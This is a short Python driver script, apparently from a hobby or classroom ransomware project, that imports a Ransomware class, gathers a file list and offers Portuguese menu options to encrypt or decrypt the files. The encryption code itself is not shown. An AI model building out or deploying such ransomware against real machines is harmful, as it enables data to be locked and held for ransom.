#!/bin/python

from ransomware import Ransomware

print("(1) Encriptar \n (2) Decriptar")

x = input(">>> ")
R = Ransomware()
R.get_file_list()

if x == "1":
    R.encrypt()
elif x == "2":
    R.decrypt()
